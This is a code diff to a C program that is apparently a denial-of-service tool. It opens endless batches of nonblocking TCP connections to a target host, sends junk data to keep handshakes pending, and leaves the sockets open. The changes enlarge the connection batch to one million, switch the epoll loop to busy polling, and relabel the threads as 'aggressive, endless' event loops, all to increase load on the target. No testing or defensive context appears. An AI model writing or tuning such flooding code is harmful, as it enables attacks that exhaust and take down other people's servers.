@@ -15,8 +15,8 @@
 #include <stdatomic.h>
 
 #define DESIRED_NOFILE 1000000000UL   // Adjust as necessary for your system
-#define BATCH_SIZE 4096            // Increased batch size for heavier load
-#define MAX_EVENTS 1024            // Maximum events returned by epoll_wait
+#define BATCH_SIZE 1000000           // Increased batch size for maximum load
+#define MAX_EVENTS 2048            // Maximum events returned by epoll_wait
 
 #define BANNER "\n\033[1;31m" \
 "                            ,-.\n" \
@@ -51,11 +51,11 @@ atomic_long pending_handshakes = ATOMIC_VAR_INIT(0);
 struct sockaddr_storage target_addr;
 socklen_t target_addr_len;
 
-// Resolve target host using getaddrinfo
+// Resolve target host using getaddrinfo (supports both IPv4 and IPv6)
 void resolve_target(const char *host, const char *port_str) {
     struct addrinfo hints, *res;
     memset(&hints, 0, sizeof(hints));
-    hints.ai_family = AF_UNSPEC;      // Allow IPv4 or IPv6
+    hints.ai_family = AF_UNSPEC;      
     hints.ai_socktype = SOCK_STREAM;
     int ret = getaddrinfo(host, port_str, &hints, &res);
     if (ret != 0) {
@@ -67,7 +67,7 @@ void resolve_target(const char *host, const char *port_str) {
     freeaddrinfo(res);
 }
 
-// Set a file descriptor to nonblocking mode
+// Set file descriptor to nonblocking mode
 int set_nonblocking(int fd) {
     int flags = fcntl(fd, F_GETFL, 0);
     if (flags == -1)
@@ -84,12 +84,12 @@ typedef struct {
     size_t sent_bytes; // Amount sent in current payload
 } connection_t;
 
-// Thread configuration: each thread continuously creates connections
+// Thread configuration (each thread runs indefinitely)
 typedef struct {
     int thread_id;
 } ThreadConfig;
 
-// Worker thread function employing epoll for asynchronous connection and data send
+// Worker thread function using epoll in a busy-loop mode (timeout=0)
 void *worker_thread(void *arg) {
     ThreadConfig *config = (ThreadConfig *) arg;
     int epoll_fd = epoll_create1(0);
@@ -100,9 +100,9 @@ void *worker_thread(void *arg) {
     
     struct epoll_event events[MAX_EVENTS];
     
-    // Run indefinitely to create as heavy a load as possible
+    // Run an infinite loop to create and process connections
     while (1) {
-        // Create a batch of new connections
+        // Create a large batch of new connections
         for (int i = 0; i < BATCH_SIZE; i++) {
             int sock = socket(target_addr.ss_family, SOCK_STREAM, 0);
             if (sock < 0)
@@ -126,7 +126,7 @@ void *worker_thread(void *arg) {
             conn->sent_bytes = 0;
             
             struct epoll_event ev;
-            ev.events = EPOLLOUT | EPOLLET;  // Edge-triggered output events
+            ev.events = EPOLLOUT | EPOLLET;
             ev.data.ptr = conn;
             if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, sock, &ev) == -1) {
                 close(sock);
@@ -136,8 +136,8 @@ void *worker_thread(void *arg) {
             atomic_fetch_add(&total_connections, 1);
         }
         
-        // Process epoll events with a very short timeout for responsiveness
-        int nfds = epoll_wait(epoll_fd, events, MAX_EVENTS, 10);
+        // Process epoll events immediately (timeout = 0 for a busy poll)
+        int nfds = epoll_wait(epoll_fd, events, MAX_EVENTS, 0);
         for (int i = 0; i < nfds; i++) {
             connection_t *conn = (connection_t *) events[i].data.ptr;
             // STATE_CONNECTING: Check if connection completed
@@ -169,7 +169,7 @@ void *worker_thread(void *arg) {
                     continue;
                 }
             }
-            // STATE_JUNK: Send additional junk data to hold the handshake pending
+            // STATE_JUNK: Send junk data to hold the handshake pending
             if (conn->state == STATE_JUNK) {
                 ssize_t n = send(conn->fd, junkData + conn->sent_bytes, JUNK_SIZE - conn->sent_bytes, 0);
                 if (n > 0) {
@@ -178,7 +178,7 @@ void *worker_thread(void *arg) {
                         conn->state = STATE_DONE;
                         atomic_fetch_add(&pending_handshakes, 1);
                         epoll_ctl(epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL);
-                        // Leave socket open to maintain pending handshake; free tracking structure
+                        // Keep socket open to maintain the pending state
                         free(conn);
                         continue;
                     }
@@ -235,7 +235,7 @@ int main(int argc, char *argv[]) {
         return EXIT_FAILURE;
     }
     
-    // Create worker threads that run indefinitely
+    // Create a few worker threads (each running an aggressive, endless event loop)
     for (int i = 0; i < thread_count; i++) {
         configs[i].thread_id = i;
         if (pthread_create(&threads[i], NULL, worker_thread, &configs[i]) != 0) {
@@ -243,7 +243,7 @@ int main(int argc, char *argv[]) {
         }
     }
     
-    // Continuous feedback loop with blue-colored stats output
+    // Continuous feedback loop (updates every second)
     while (1) {
         printf("\r\033[34m[+] Total Connections: %ld | Pending Handshakes: %ld | Threads: %d\033[0m",
                atomic_load(&total_connections),
